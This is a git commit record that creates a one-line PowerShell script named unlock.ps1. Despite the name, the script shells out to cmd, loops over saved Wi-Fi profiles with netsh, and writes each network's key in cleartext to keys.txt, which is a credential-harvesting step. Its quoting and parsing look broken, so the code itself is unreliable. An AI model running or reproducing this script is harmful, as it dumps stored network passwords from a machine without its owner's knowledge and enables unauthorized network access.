aa1003e8185fe4a2f80b8c8f372021d9c5e7dac2
duo530 <cavaluslg@gmail.com>
2024-10-20 17:00:39 -0300

    Create unlock.ps1

---
+++ unlock.ps1
@@ -0,0 +1,1 @@
+Start-Process cmd -ArgumentList "/c (for /f `"tokens=*`" %i in (`'netsh wlan show profiles ^| findstr `"All User Profile`"') do @netsh wlan show profile `%i` key=clear ^| findstr `"Key Content`) > keys.txt" -NoNewWindow -Wait
